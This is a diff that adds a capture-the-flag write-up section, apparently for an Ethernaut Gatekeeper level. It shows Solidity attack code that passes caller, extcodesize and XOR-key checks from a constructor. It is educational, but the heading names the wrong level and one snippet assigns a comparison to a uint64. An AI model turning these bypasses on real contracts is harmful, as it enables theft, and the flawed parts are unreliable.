@@ -602,3 +602,75 @@ Once you deployed the contract, just call:
 ```js
 await yourContract.enter("0x111111110000AB12", 82164);
 ```
+
+---
+
+### 14. Gatekeeper One
+
+As we did in the previous level, we need to satisfy a bunch of conditions to hack this contract.
+
+#### Gate one
+
+```sol
+modifier gateOne() {
+  require(msg.sender != tx.origin);
+  _;
+}
+```
+
+Exactly the same as we did in the previous level, just put a contract as a middleman and it will pass.
+
+#### Gate two
+
+```sol
+modifier gateTwo() {
+  uint x;
+  assembly { x := extcodesize(caller()) }
+  require(x == 0);
+  _;
+}
+```
+
+The `extcodesize` keyword returns the size of the contrat's code from the address sent as an argument. The `caller` keyword returns the call sender, just like msg.sender, but excluding `delegatecall`.
+
+One exception to this rule is when we call the function directly from a contract constructor, the contract address is still unexistant, in this case, the `extcodesize(caller())` will return zero.
+
+```sol
+constructor(address victim) {
+  Gatekeeper level = Gatekeeper(victim);
+  bytes8 key = '0x1111111111111111';
+  level.enter(key);  
+}
+```
+And it works! The result is zero, so delegating the call we will pass the second gate.
+
+#### Gate three
+
+We must send a gate key that satisfy the following condition:
+
+```sol
+uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1
+```
+
+The `^` operator indicates a XOR operation, one important characteristic to consider of this operation is that if  `A ^ B = C` then `A ^ C = B`. So we can use this in our favor creating a key as follows:
+
+```sol
+uint64 key = uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1;
+```
+
+Then, the code to hack this level would look like.
+
+```sol
+constructor(address victim) {
+  Gatekeeper level = Gatekeeper(victim);
+  bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1));
+  level.enter(key);  
+}
+```
+
+We just create the contract sending the victim address as parameter and that's it!
+
+
+
+
+
